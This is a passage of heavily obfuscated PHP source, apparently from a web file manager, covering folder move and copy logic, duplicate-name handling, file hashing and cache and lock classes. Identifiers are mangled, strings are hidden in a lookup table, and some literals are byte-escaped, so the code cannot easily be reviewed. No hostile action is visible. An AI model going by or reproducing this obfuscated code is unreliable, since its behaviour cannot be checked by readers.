array($İË¨Á»á[523] => array($İË¨Á»á[546], $â±£„Ø[$İË¨Á»á[523]] . $¯ì°¥Ş . $İË¨Á»á[547]), $İË¨Á»á[433] => $this->targetIsDelete); $”Áğô = $this->field($Ö•ã¡«ü)->where($¾–ÎÍúô)->select(); if (!$”Áğô) { return; } $”Áğô = array_to_keyvalue($”Áğô, $İË¨Á»á[405]); foreach ($”Áğô as $¼ì˜³Ä) { $µè‹¬Û‰ = $¼ì˜³Ä[$İË¨Á»á[500]]; $¯ì°¥Ş = $¼ì˜³Ä[$İË¨Á»á[405]]; if (!isset($this->_childrenListCache[$¯ì°¥Ş]) && $¼ì˜³Ä[$İË¨Á»á[413]] == $İË¨Á»á[99]) { $this->_childrenListCache[$¯ì°¥Ş] = array(); } if (!isset($this->_childrenListCache[$µè‹¬Û‰])) { $this->_childrenListCache[$µè‹¬Û‰] = array(); } $this->_childrenListCache[$µè‹¬Û‰][$¯ì°¥Ş] = $¼ì˜³Ä; $this->_childrenItemCache[$¯ì°¥Ş] = $¼ì˜³Ä; } } private function _childrenListAll($ƒÚÍ—¶È, &$†ßê¿ä) { $Ñ‘¨º‡ =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->_childrenListCache[$ƒÚÍ—¶È])) { return; } $¡ûÖªàà = $this->_childrenListCache[$ƒÚÍ—¶È]; foreach ($¡ûÖªàà as $÷÷à¹€ç => $®©§€ñå) { $†ßê¿ä[$÷÷à¹€ç] = $®©§€ñå; if ($®©§€ñå[$Ñ‘¨º‡[413]] == $Ñ‘¨º‡[99]) { $this->_childrenListAll($÷÷à¹€ç, $†ßê¿ä); } } } private function sourceInfoCache($èûŒÛ³÷) { if (isset($this->_childrenItemCache[$èûŒÛ³÷])) { return $this->_childrenItemCache[$èûŒÛ³÷]; } return $this->sourceInfo($èûŒÛ³÷); } private function _childrenList($ğî§²ùŞ) { if (isset($this->_childrenListCache[$ğî§²ùŞ])) { return $this->_childrenListCache[$ğî§²ùŞ]; } return $this->_childrenListSelect($ğî§²ùŞ); } private function _childrenListSelect($Ìı¢õ’) { $®Õş¥¢ =& $_SERVER[ë¦»ºéÌ]; $ñ¯´‰ï” = array($®Õş¥¢[500] => $Ìı¢õ’, $®Õş¥¢[433] => $this->targetIsDelete); $êàÌÎõ¼ = $this->where($ñ¯´‰ï”)->select(); $êàÌÎõ¼ = $êàÌÎõ¼ ? $êàÌÎõ¼ : array(); $€í£ò±Ä = array_to_keyvalue($êàÌÎõ¼, $®Õş¥¢[405]); $this->_childrenListCache[$Ìı¢õ’] = $€í£ò±Ä; foreach ($€í£ò±Ä as $Ìı¢õ’ => $ÛŞ©äÊÅ) { $this->_childrenItemCache[$Ìı¢õ’] = $ÛŞ©äÊÅ; } return $€í£ò±Ä; } private function fileNameExistCache($”ª³±šÓ, $ğÓ™äİÏ) { $Ş¡úô†¤ =& $_SERVER[ë¦»ºéÌ]; $ğÓ™äİÏ = strtolower($ğÓ™äİÏ); $‘éÚä¹€ = $this->_childrenList($”ª³±šÓ); foreach ($‘éÚä¹€ as $ãÕÕÛş) { if ($ğÓ™äİÏ == strtolower($ãÕÕÛş[$Ş¡úô†¤[42]])) { return $ãÕÕÛş[$Ş¡úô†¤[405]]; } } return !1; } private function fileNameAutoCache($ûÂ¡ü, $äĞô¨Êã, $ÅğÄûæ§, $±áÌ›•ú) { $»ÀêêôÏ =& $_SERVER[ë¦»ºéÌ]; $´ Ù•şÓ = $this->_childrenList($ûÂ¡ü); $Ü„ş¸¬· = array_to_keyvalue($´ Ù•şÓ, $»ÀêêôÏ[12], $»ÀêêôÏ[42]); return $this->fileNameAutoGet($Ü„ş¸¬·, $äĞô¨Êã, $ÅğÄûæ§, $±áÌ›•ú); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($´ê÷ôÕë, $¼‘ª—°›, $İÙ±µ¹Ø = REPEAT_REPLACE, $Ê‡ÅúÈ† = '') { $æŠ¿ÍŒõ =& $_SERVER[ë¦»ºéÌ]; $‡Öˆ˜Ñé = $this->sourceInfo($´ê÷ôÕë); $¨¤§—’ = $this->sourceInfo($¼‘ª—°›); if ($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[500]] == $¨¤§—’[$æŠ¿ÍŒõ[405]]) { if ($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[433]] == $æŠ¿ÍŒõ[99]) { Model($æŠ¿ÍŒõ[431])->restore(array($´ê÷ôÕë)); } if (!$Ê‡ÅúÈ† || $Ê‡ÅúÈ† == $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[42]]) { return $´ê÷ôÕë; } } $Ü¦Ÿ¬Õç = $this->pathInfoMore($´ê÷ôÕë); if ($this->isParentOf($´ê÷ôÕë, $¼‘ª—°›)) { return !1; } if (!$‡Öˆ˜Ñé || !$¨¤§—’ || $¨¤§—’[$æŠ¿ÍŒõ[413]] != $æŠ¿ÍŒõ[99]) { return !1; } Hook::trigger($æŠ¿ÍŒõ[592], $Ü¦Ÿ¬Õç); $this->targetIsDelete = intval($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[433]]); if ($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[500]] == $¼‘ª—°› && $Ê‡ÅúÈ† != $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[42]]) { $îÅªòîã = $this->fileNameExist($¼‘ª—°›, $Ê‡ÅúÈ†); if ($îÅªòîã && $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[413]] == $æŠ¿ÍŒõ[202]) { $Ş±¬Ú¸Ğ = $this->sourceInfo($îÅªòîã); $¬ˆ×…×¢ = $this->fileHistory($Ş±¬Ú¸Ğ, $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[469]], $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[90]]); if (!$¬ˆ×…×¢) { Model($æŠ¿ÍŒõ[472])->remove($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[469]]); } $this->removeNow($´ê÷ôÕë, !1); $this->folderSizeReset($¼‘ª—°›); Hook::trigger($æŠ¿ÍŒõ[593], $Ü¦Ÿ¬Õç); return $îÅªòîã; } } $œ¸çäª = $Ê‡ÅúÈ† ? $Ê‡ÅúÈ† : $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[42]]; $this->lockMoveStart($´ê÷ôÕë); $this->lockWriteStart($¼‘ª—°›, $œ¸çäª); $ôÏé¦˜ = array($æŠ¿ÍŒõ[562] => array(), $æŠ¿ÍŒõ[594] => !1); $this->clearShare($´ê÷ôÕë, $¼‘ª—°›); $¶£š÷ğÜ = $this->fileNameExistCache($¼‘ª—°›, $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[42]]); $ûƒ¬¶¨… = $this->_move($´ê÷ôÕë, $¼‘ª—°›, $İÙ±µ¹Ø, $ôÏé¦˜, $Ê‡ÅúÈ†); $this->sourceCacheClear(); if ($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[413]] == $æŠ¿ÍŒõ[99] && $¶£š÷ğÜ) { $this->folderSizeResetChildren($ûƒ¬¶¨…); } Model($æŠ¿ÍŒõ[204])->linkAdd($ôÏé¦˜[$æŠ¿ÍŒõ[562]]); if ($¶£š÷ğÜ && $ôÏé¦˜[$æŠ¿ÍŒõ[594]]) { $this->removeNow($´ê÷ôÕë, !1); } $this->lockMoveEnd($´ê÷ôÕë); $this->lockWriteEnd($¼‘ª—°›, $œ¸çäª); $this->folderSizeReset($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[500]]); $this->folderSizeReset($¼‘ª—°›); $ÍŒ‡Âí = array($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[500]], $¼‘ª—°›); if ($‡Öˆ˜Ñé[$æŠ¿ÍŒõ[413]] == $æŠ¿ÍŒõ[99]) { $ÍŒ‡Âí[] = $´ê÷ôÕë; } $this->updateModifyTime($ÍŒ‡Âí); Model($æŠ¿ÍŒõ[566])->eventMove($´ê÷ôÕë, $‡Öˆ˜Ñé[$æŠ¿ÍŒõ[500]], $¼‘ª—°›); Hook::trigger($æŠ¿ÍŒõ[593], $Ü¦Ÿ¬Õç); return $ûƒ¬¶¨…; } private function _move($üŒ«â÷Å, $†–Ëãéü, $šŠüÓ”©, &$ó…ßé¨Ä, $˜”èÅ¹‹ = '') { $ÉÕ“Àš¥ =& $_SERVER[ë¦»ºéÌ]; $´Œ¢ğÌ† = $this->sourceInfo($üŒ«â÷Å); $çÖ•³™ = $´Œ¢ğÌ†[$ÉÕ“Àš¥[413]] == $ÉÕ“Àš¥[99]; $ı§«¦ø¦ = $˜”èÅ¹‹ ? $˜”èÅ¹‹ : $´Œ¢ğÌ†[$ÉÕ“Àš¥[42]]; $Ş”ŠÛ¤Ï = $this->fileNameExistCache($†–Ëãéü, $ı§«¦ø¦); $this->lockMoveStart($üŒ«â÷Å); $this->lockWriteStart($†–Ëãéü, $ı§«¦ø¦); if (!$Ş”ŠÛ¤Ï) { return $this->_moveForce($üŒ«â÷Å, $†–Ëãéü, $ı§«¦ø¦); } $Ş¼Çõ—í = $Ş”ŠÛ¤Ï; $áªßşëœ = !1; if ($çÖ•³™) { if ($šŠüÓ”© == REPEAT_RENAME_FOLDER) { $ı§«¦ø¦ = $this->fileNameAuto($†–Ëãéü, $ı§«¦ø¦, $šŠüÓ”©, $çÖ•³™); $Ş¼Çõ—í = $this->_moveForce($üŒ«â÷Å, $†–Ëãéü, $ı§«¦ø¦); } else { if ($šŠüÓ”© == REPEAT_RENAME_FOLDER) { $šŠüÓ”© = REPEAT_RENAME; } $ö‚ñ®ÂÔ = $this->_childrenListSelect($üŒ«â÷Å); foreach ($ö‚ñ®ÂÔ as $®Ê—À–) { $this->_move($®Ê—À–[$ÉÕ“Àš¥[405]], $Ş”ŠÛ¤Ï, $šŠüÓ”©, $ó…ßé¨Ä); } $áªßşëœ = !0; } } else { if ($šŠüÓ”© == REPEAT_SKIP) { $áªßşëœ = !0; } else { if ($šŠüÓ”© == REPEAT_RENAME || $šŠüÓ”© == REPEAT_RENAME_FOLDER) { $ı§«¦ø¦ = $this->fileNameAuto($†–Ëãéü, $ı§«¦ø¦, $šŠüÓ”©, $çÖ•³™); $Ş¼Çõ—í = $this->_moveForce($üŒ«â÷Å, $†–Ëãéü, $ı§«¦ø¦); } else { if ($šŠüÓ”© == REPEAT_REPLACE) { $ôŞÒı¾ = $this->sourceInfoCache($Ş”ŠÛ¤Ï); $âŞº¿¯Õ = $this->fileHistory($ôŞÒı¾, $´Œ¢ğÌ†[$ÉÕ“Àš¥[469]], $´Œ¢ğÌ†[$ÉÕ“Àš¥[90]]); $áªßşëœ = !0; if ($âŞº¿¯Õ) { $ó…ßé¨Ä[$ÉÕ“Àš¥[562]][] = $´Œ¢ğÌ†[$ÉÕ“Àš¥[469]]; } } } } } if ($áªßşëœ && !$ó…ßé¨Ä[$ÉÕ“Àš¥[594]]) { $ó…ßé¨Ä[$ÉÕ“Àš¥[594]] = !0; } return $Ş¼Çõ—í; } private function _moveForce($£«¾â¦â, $™ò§å¸è, $è¶š»»§) { $Ç¸´²‡ô =& $_SERVER[ë¦»ºéÌ]; $à‡Ú©œ = $this->sourceInfo($£«¾â¦â); $Ñ°€û” = $this->sourceInfo($™ò§å¸è); $ğ±­½‹Ú = $à‡Ú©œ[$Ç¸´²‡ô[413]] == $Ç¸´²‡ô[99]; $üñ¸øëß = array($Ç¸´²‡ô[404] => $Ñ°€û”[$Ç¸´²‡ô[405]], $Ç¸´²‡ô[586] => $Ñ°€û”[$Ç¸´²‡ô[523]] . $Ñ°€û”[$Ç¸´²‡ô[405]] . $Ç¸´²‡ô[60], $Ç¸´²‡ô[582] => $Ñ°€û”[$Ç¸´²‡ô[414]], $Ç¸´²‡ô[583] => $Ñ°€û”[$Ç¸´²‡ô[506]], $Ç¸´²‡ô[585] => USER_ID, $Ç¸´²‡ô[423] => $è¶š»»§); $ÖÎúãÕÜ = $à‡Ú©œ[$Ç¸´²‡ô[414]] == SourceModel::TYPE_GROUP && $Ñ°€û”[$Ç¸´²‡ô[414]] == SourceModel::TYPE_GROUP && $à‡Ú©œ[$Ç¸´²‡ô[506]] == $Ñ°€û”[$Ç¸´²‡ô[506]]; if (!$ÖÎúãÕÜ && $this->moveClearAuth) { Model($Ç¸´²‡ô[504])->authClear($£«¾â¦â); } $÷àÅÜÖµ = $à‡Ú©œ[$Ç¸´²‡ô[433]] == $Ç¸´²‡ô[99] && $Ñ°€û”[$Ç¸´²‡ô[433]] != $Ç¸´²‡ô[99]; if ($÷àÅÜÖµ) { $üñ¸øëß[$Ç¸´²‡ô[432]] = 0; } if ($ğ±­½‹Ú) { $ùãäæ‡¼ = array($Ç¸´²‡ô[586] => array($Ç¸´²‡ô[546], $à‡Ú©œ[$Ç¸´²‡ô[523]] . $à‡Ú©œ[$Ç¸´²‡ô[405]] . $Ç¸´²‡ô[547])); $ŠûâÏ¸À = $à‡Ú©œ[$Ç¸´²‡ô[523]] . $à‡Ú©œ[$Ç¸´²‡ô[405]] . $Ç¸´²‡ô[60]; $ö¢ˆ‘â× = $Ñ°€û”[$Ç¸´²‡ô[523]] . $Ñ°€û”[$Ç¸´²‡ô[405]] . $Ç¸´²‡ô[60] . $à‡Ú©œ[$Ç¸´²‡ô[405]] . $Ç¸´²‡ô[60]; $¯ŠÈƒñÆ = array($Ç¸´²‡ô[586] => array($Ç¸´²‡ô[595], "\x72\145\160\x6c\141\x63\145\x28\x70\x61\x72\145\x6e\x74\114\145\x76\x65\x6c\x2c\x27{$ŠûâÏ¸À}\x27\x2c\47{$ö¢ˆ‘â×}\x27\x29"), $Ç¸´²‡ô[582] => $Ñ°€û”[$Ç¸´²‡ô[414]], $Ç¸´²‡ô[583] => $Ñ°€û”[$Ç¸´²‡ô[506]]); if ($÷àÅÜÖµ) { $¯ŠÈƒñÆ[$Ç¸´²‡ô[432]] = 0; } $this->where($ùãäæ‡¼)->data($¯ŠÈƒñÆ)->save(); } $this->where(array($Ç¸´²‡ô[420] => $£«¾â¦â))->data($üñ¸øëß)->save(); return $£«¾â¦â; } private function clearShare($¿²ÆµÉÍ, $¥Ï°‹ï¾) { $Ï–¹Ì°Á =& $_SERVER[ë¦»ºéÌ]; $Ú¶±½Ø÷ = $this->sourceInfo($¿²ÆµÉÍ); $Ò›Œ—‡ = $this->sourceInfo($¥Ï°‹ï¾); if ($Ú¶±½Ø÷[$Ï–¹Ì°Á[506]] == $Ò›Œ—‡[$Ï–¹Ì°Á[506]] && $Ú¶±½Ø÷[$Ï–¹Ì°Á[414]] == $Ï–¹Ì°Á[596]) { return; } $É¥ïò—¶ = array($Ï–¹Ì°Á[523] => array($Ï–¹Ì°Á[546], $Ú¶±½Ø÷[$Ï–¹Ì°Á[523]] . $¿²ÆµÉÍ . $Ï–¹Ì°Á[547])); $ŠØßŞ”ö = $this->field($Ï–¹Ì°Á[420])->where($É¥ïò—¶)->getField($Ï–¹Ì°Á[405], !0); if (!$ŠØßŞ”ö) { return; } $É¥ïò—¶ = array($Ï–¹Ì°Á[405] => array($Ï–¹Ì°Á[7], $ŠØßŞ”ö), $Ï–¹Ì°Á[497] => 1); $ë¬òËù = Model($Ï–¹Ì°Á[597])->field($Ï–¹Ì°Á[490])->where($É¥ïò—¶)->select(); if (!$ë¬òËù) { return; } $ë¬òËù = array_to_keyvalue($ë¬òËù, $Ï–¹Ì°Á[12], $Ï–¹Ì°Á[490]); $É¥ïò—¶ = array($Ï–¹Ì°Á[490] => array($Ï–¹Ì°Á[7], $ë¬òËù)); Model($Ï–¹Ì°Á[597])->where($É¥ïò—¶)->save(array($Ï–¹Ì°Á[497] => 0)); Model($Ï–¹Ì°Á[598])->where($É¥ïò—¶)->delete(); } public function copyFolderFromIO($Çé¡şñ›, $“€Œë©, $øÉ”¯¸î, $Ï·‚ÛŠÎ, $ÄíÆåÉˆ, $Ô°ê°ìã = false) { $‚ÈÑœüì =& $_SERVER[ë¦»ºéÌ]; $ƒ¥±·Á‘ = array($‚ÈÑœüì[563] => array(), $‚ÈÑœüì[564] => array(), $‚ÈÑœüì[562] => array(), $‚ÈÑœüì[599] => array()); $Ş–‰ğú… = $Ô°ê°ìã ? $Ô°ê°ìã : $Çé¡şñ›->pathThis($“€Œë©); $‰²ÏÊÃ³ = $this->fileNameExist($øÉ”¯¸î, $Ş–‰ğú…); $¹¶¤Ù¼ï = $this->mkdir($øÉ”¯¸î, $Ş–‰ğú…, $Ï·‚ÛŠÎ); if (!$‰²ÏÊÃ³ || $Ï·‚ÛŠÎ == REPEAT_RENAME_FOLDER) { $Ï·‚ÛŠÎ = !1; } if ($‰²ÏÊÃ³) { $this->_childrenAllMake($‰²ÏÊÃ³); } Hook::trigger($‚ÈÑœüì[600]); $this->_copyChildTo($Çé¡şñ›, $“€Œë©, $¹¶¤Ù¼ï, $Ï·‚ÛŠÎ, $ƒ¥±·Á‘, $ÄíÆåÉˆ); Hook::trigger($‚ÈÑœüì[601]); if ($¹¶¤Ù¼ï) { $this->folderSizeResetChildren($¹¶¤Ù¼ï); } $this->_childrenListClear(); Model($‚ÈÑœüì[565])->addAll($ƒ¥±·Á‘[$‚ÈÑœüì[563]], array(), !0); Model($‚ÈÑœüì[566])->eventCopy($¹¶¤Ù¼ï); $this->saveAll($ƒ¥±·Á‘[$‚ÈÑœüì[564]]); Model($‚ÈÑœüì[472])->linkAdd($ƒ¥±·Á‘[$‚ÈÑœüì[562]]); Model($‚ÈÑœüì[472])->remove($ƒ¥±·Á‘[$‚ÈÑœüì[599]]); $this->folderSizeReset($øÉ”¯¸î); $this->updateModifyTime($øÉ”¯¸î); return $¹¶¤Ù¼ï; } private function _copyChildTo($‘ÌÏ¿¦Ç, $Ã÷Û‚á, $±€ÙÔ¢¡, $³°Û¬†è, &$ÃÂ—ƒ, $Ç¾ü£¬ã) { $åãŒï‰Ú =& $_SERVER[ë¦»ºéÌ]; $â•§áê» = $this->sourceInfoCache($±€ÙÔ¢¡); $ú³ŸÙ‰Ê = $‘ÌÏ¿¦Ç->listPath($Ã÷Û‚á); $ú³ŸÙ‰Ê = $ú³ŸÙ‰Ê ? $ú³ŸÙ‰Ê : array($åãŒï‰Ú[86] => array(), $åãŒï‰Ú[87] => array()); $†ØÛû„Œ = array_merge($ú³ŸÙ‰Ê[$åãŒï‰Ú[86]], $ú³ŸÙ‰Ê[$åãŒï‰Ú[87]]); $æ‚ûñáĞ = $this->_addFiles($‘ÌÏ¿¦Ç, $ú³ŸÙ‰Ê[$åãŒï‰Ú[86]], $Ç¾ü£¬ã); $¦àê¢€á = array(); foreach ($†ØÛû„Œ as &$œĞ¼ô) { if (isset($æ‚ûñáĞ[$œĞ¼ô[$åãŒï‰Ú[42]]])) { $œĞ¼ô = $æ‚ûñáĞ[$œĞ¼ô[$åãŒï‰Ú[42]]]; } $œĞ¼ô[$åãŒï‰Ú[413]] = $œĞ¼ô[$åãŒï‰Ú[43]] == $åãŒï‰Ú[89]; $œĞ¼ô[$åãŒï‰Ú[415]] = _get($œĞ¼ô, $åãŒï‰Ú[179], $åãŒï‰Ú[12]); $œĞ¼ô[$åãŒï‰Ú[90]] = _get($œĞ¼ô, $åãŒï‰Ú[90], 0); $œĞ¼ô[$åãŒï‰Ú[469]] = _get($œĞ¼ô, $åãŒï‰Ú[469], 0); if (!isset($œĞ¼ô[$åãŒï‰Ú[602]]) && $œĞ¼ô[$åãŒï‰Ú[469]]) { $ÃÂ—ƒ[$åãŒï‰Ú[599]][] = $œĞ¼ô[$åãŒï‰Ú[469]]; } if ($³°Û¬†è) { $ö¹‡¯Áø = $this->fileNameExistCache($±€ÙÔ¢¡, $œĞ¼ô[$åãŒï‰Ú[42]]); if ($ö¹‡¯Áø) { if ($œĞ¼ô[$åãŒï‰Ú[413]] || $³°Û¬†è == REPEAT_SKIP) { continue; } if ($³°Û¬†è == REPEAT_REPLACE) { $ê‚ƒğäÊ = $this->sourceInfoCache($ö¹‡¯Áø); $í¿èİ = $this->fileHistory($ê‚ƒğäÊ, $œĞ¼ô[$åãŒï‰Ú[469]], $œĞ¼ô[$åãŒï‰Ú[90]]); if ($í¿èİ) { $ÃÂ—ƒ[$åãŒï‰Ú[562]][] = $œĞ¼ô[$åãŒï‰Ú[469]]; } continue; } else { if ($³°Û¬†è == REPEAT_RENAME) { $œĞ¼ô[$åãŒï‰Ú[42]] = $this->fileNameAutoCache($±€ÙÔ¢¡, $œĞ¼ô[$åãŒï‰Ú[42]], $³°Û¬†è, !1); } } } } if (!$œĞ¼ô[$åãŒï‰Ú[413]] && $œĞ¼ô[$åãŒï‰Ú[469]] == 0) { continue; } if (!$œĞ¼ô[$åãŒï‰Ú[413]] && $œĞ¼ô[$åãŒï‰Ú[469]]) { $ÃÂ—ƒ[$åãŒï‰Ú[562]][] = $œĞ¼ô[$åãŒï‰Ú[469]]; } $¦àê¢€á[] = $this->_makeItemData($œĞ¼ô, $â•§áê», $œĞ¼ô[$åãŒï‰Ú[42]]); } unset($œĞ¼ô); if (!empty($¦àê¢€á)) { $this->addAll($¦àê¢€á); $this->_childrenListSelect($±€ÙÔ¢¡); } $ùêÇëÌı = $this->_childrenList($±€ÙÔ¢¡); $ùêÇëÌı = array_to_keyvalue($ùêÇëÌı, $åãŒï‰Ú[42]); foreach ($†ØÛû„Œ as $œĞ¼ô) { $ê‚ƒğäÊ = $ùêÇëÌı[$œĞ¼ô[$åãŒï‰Ú[42]]]; $¡ù¼šÃÁ = $ê‚ƒğäÊ[$åãŒï‰Ú[405]]; $this->_copyApplyMeta($ê‚ƒğäÊ, $ÃÂ—ƒ); if ($œĞ¼ô[$åãŒï‰Ú[43]] == $åãŒï‰Ú[89]) { $œĞ¼ô[$åãŒï‰Ú[88]] = $‘ÌÏ¿¦Ç->getPathInner($œĞ¼ô[$åãŒï‰Ú[88]]); $this->_copyChildTo($‘ÌÏ¿¦Ç, $œĞ¼ô[$åãŒï‰Ú[88]], $¡ù¼šÃÁ, $³°Û¬†è, $ÃÂ—ƒ, $Ç¾ü£¬ã); } } } private function _addFiles($åÎ®ÍÜ¾, $İ–¦Õû¢, $’ìİî ‡) { $”””Ä™É =& $_SERVER[ë¦»ºéÌ]; if (!$İ–¦Õû¢ || count($İ–¦Õû¢) == 0) { return array(); } $í÷á‘™Î = array(); foreach ($İ–¦Õû¢ as &$İÄ®úë©) { Hook::trigger($”””Ä™É[603], $İÄ®úë©); $İÄ®úë©[$”””Ä™É[88]] = $åÎ®ÍÜ¾->getPathInner($İÄ®úë©[$”””Ä™É[88]]); $Ï•Æ†ñû = $åÎ®ÍÜ¾->hashSimple($İÄ®úë©[$”””Ä™É[88]]); $Ô“‹æ‡Ó = $åÎ®ÍÜ¾->hashMd5($İÄ®úë©[$”””Ä™É[88]]); if (strlen($Ô“‹æ‡Ó) > 10 && !isset($í÷á‘™Î[$Ô“‹æ‡Ó])) { $í÷á‘™Î[$Ô“‹æ‡Ó] = array(); } $İÄ®úë©[$”””Ä™É[182]] = $Ï•Æ†ñû; $İÄ®úë©[$”””Ä™É[181]] = $Ô“‹æ‡Ó; Hook::trigger($”””Ä™É[604], $İÄ®úë©); $í÷á‘™Î[$Ô“‹æ‡Ó][] =& $İÄ®úë©; if (count($í÷á‘™Î[$Ô“‹æ‡Ó]) > 1) { $İÄ®úë©[$”””Ä™É[602]] = !0; } } unset($İÄ®úë©); $Û¥½°Åş = array($”””Ä™É[181] => array($”””Ä™É[7], array_keys($í÷á‘™Î))); $êüû£¼ = Model($”””Ä™É[605]); $¶ÂËŞ ´ = $êüû£¼->where($Û¥½°Åş)->select(); $¶ÂËŞ ´ = $¶ÂËŞ ´ ? $¶ÂËŞ ´ : array(); foreach ($¶ÂËŞ ´ as $ÔŸæˆÂ) { if (!isset($í÷á‘™Î[$ÔŸæˆÂ[$”””Ä™É[181]]])) { continue; } $‘·¤Ü—‚ = $í÷á‘™Î[$ÔŸæˆÂ[$”””Ä™É[181]]]; foreach ($‘·¤Ü—‚ as &$İÄ®úë©) { $İÄ®úë©[$”””Ä™É[469]] = $ÔŸæˆÂ[$”””Ä™É[469]]; $İÄ®úë©[$”””Ä™É[602]] = !0; } unset($İÄ®úë©); } $œ„ã¢Š´ = array(); foreach ($İ–¦Õû¢ as $°Æ¿ÎÉá) { if (isset($°Æ¿ÎÉá[$”””Ä™É[602]]) && $°Æ¿ÎÉá[$”””Ä™É[602]]) { continue; } $¯½ ß†˜ = $åÎ®ÍÜ¾->getPathInner($°Æ¿ÎÉá[$”””Ä™É[88]]); $Å›Ú®©ë = $êüû£¼->addFileMake($¯½ ß†˜, $°Æ¿ÎÉá[$”””Ä™É[90]], $°Æ¿ÎÉá[$”””Ä™É[182]], $°Æ¿ÎÉá[$”””Ä™É[181]], $°Æ¿ÎÉá[$”””Ä™É[42]], $’ìİî ‡); if (!is_array($Å›Ú®©ë)) { continue; } $œ„ã¢Š´[] = $Å›Ú®©ë; } $êüû£¼->addAll($œ„ã¢Š´); $Û¥½°Åş = array($”””Ä™É[181] => array($”””Ä™É[7], array_keys($í÷á‘™Î))); $¶ÂËŞ ´ = $êüû£¼->where($Û¥½°Åş)->select(); $¶ÂËŞ ´ = $¶ÂËŞ ´ ? $¶ÂËŞ ´ : array(); foreach ($¶ÂËŞ ´ as $ÔŸæˆÂ) { if (!isset($í÷á‘™Î[$ÔŸæˆÂ[$”””Ä™É[181]]])) { continue; } $¶“ÙòÀ» =& $í÷á‘™Î[$ÔŸæˆÂ[$”””Ä™É[181]]]; foreach ($¶“ÙòÀ» as &$İÄ®úë©) { $İÄ®úë©[$”””Ä™É[469]] = $ÔŸæˆÂ[$”””Ä™É[469]]; } unset($İÄ®úë©); } $ä¼àØçİ = array(); foreach ($İ–¦Õû¢ as $ªØÍ¨Ğé) { $ä¼àØçİ[$ªØÍ¨Ğé[$”””Ä™É[42]]] = $ªØÍ¨Ğé; } return $ä¼àØçİ; } } define($_SERVER[ë¦»ºéÌ][606], $_SERVER[ë¦»ºéÌ][607]); $erjzalsngf = $_SERVER[ë¦»ºéÌ][608]; goto cë‡öÀÖ†; e˜ŠØñ£É: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($€‡­Æ‡è, $ƒ©ç¹ÇÑ) { $íÌ€¶±õ =& $_SERVER[ë¦»ºéÌ]; $this->cachePath = $€‡­Æ‡è[$íÌ€¶±õ[88]]; $this->prefix = $íÌ€¶±õ[818]; $this->cacheTime = $ƒ©ç¹ÇÑ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ªš¶”³ß) { $¬¾‹¾Áò =& $_SERVER[ë¦»ºéÌ]; $ªš¶”³ß = str_replace(array($¬¾‹¾Áò[819], $¬¾‹¾Áò[108], $¬¾‹¾Áò[83]), $¬¾‹¾Áò[820], $ªš¶”³ß); return $this->cachePath . $¬¾‹¾Áò[821] . $ªš¶”³ß . $¬¾‹¾Áò[822]; } public function set($öµ¤¼ÊÊ, $õóå©õµ, $ôäß‘ô¸ = false) { $ªÅ¥¢‰è = $this->getFile($öµ¤¼ÊÊ); if (file_put_contents($ªÅ¥¢‰è, $this->prefix . $õóå©õµ, LOCK_EX)) { @touch($ªÅ¥¢‰è, intval(time() + $ôäß‘ô¸)); clearstatcache(); return !0; } @unlink($ªÅ¥¢‰è); return !1; } public function get($¦¢Óº¬) { $•¹óãÅÖ = $this->getFile($¦¢Óº¬); if (file_exists($•¹óãÅÖ) && filemtime($•¹óãÅÖ) < time()) { @unlink($•¹óãÅÖ); return !1; } $Òø¾ôğÁ = @file_get_contents($•¹óãÅÖ); return substr($Òø¾ôğÁ, strlen($this->prefix)); } public function remove($íø”˜ä») { $ö óä¾ = $this->getFile($íø”˜ä»); return @unlink($ö óä¾); } public function deleteAll() { $Ò‰àíÁÄ =& $_SERVER[ë¦»ºéÌ]; $ËËúôô = scandir($this->cachePath); foreach ($ËËúôô as $¹¯‘Ò¦õ) { $«ô¤úÑ¶ = $this->cachePath . $¹¯‘Ò¦õ; if (strpos($«ô¤úÑ¶, $Ò‰àíÁÄ[822]) && strpos($«ô¤úÑ¶, $Ò‰àíÁÄ[823])) { @unlink($«ô¤úÑ¶); } } } public function clearTimeout() { $òÇÍëí¶ =& $_SERVER[ë¦»ºéÌ]; $ØŒµ¿œü = scandir($this->cachePath); foreach ($ØŒµ¿œü as $‡›ÄÍ’) { $ß‹ß —™ = $this->cachePath . $‡›ÄÍ’; if (strpos($ß‹ß —™, $òÇÍëí¶[822]) && strpos($ß‹ß —™, $òÇÍëí¶[823]) && filemtime($ß‹ß —™) < time()) { @unlink($ß‹ß —™); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $æøğª¢¦ =& $_SERVER[ë¦»ºéÌ]; if (self::$handle) { return self::$handle; } $ä°Şî®Ç = $GLOBALS[$æøğª¢¦[6]][$æøğª¢¦[355]]; self::$timeout = $ä°Şî®Ç[$æøğª¢¦[824]] ? $ä°Şî®Ç[$æøğª¢¦[824]] : 10; $Ùí£–Ğ = _get($GLOBALS[$æøğª¢¦[6]], $æøğª¢¦[825]); $¯æİ´¢œ = $ä°Şî®Ç[$æøğª¢¦[811]] ? $ä°Şî®Ç[$æøğª¢¦[811]] : $æøğª¢¦[204]; if ($¯æİ´¢œ == $æøğª¢¦[31] && $Ùí£–Ğ == $æøğª¢¦[23]) { $¯æİ´¢œ = $æøğª¢¦[204]; } switch ($¯æİ´¢œ) { case $æøğª¢¦[814]: self::$handle = new CacheLockRedis(); break; case $æøğª¢¦[815]: self::$handle = new CacheLockMemcached(); break; case $æøğª¢¦[31]: self::$handle = new CacheLockDatabase(); 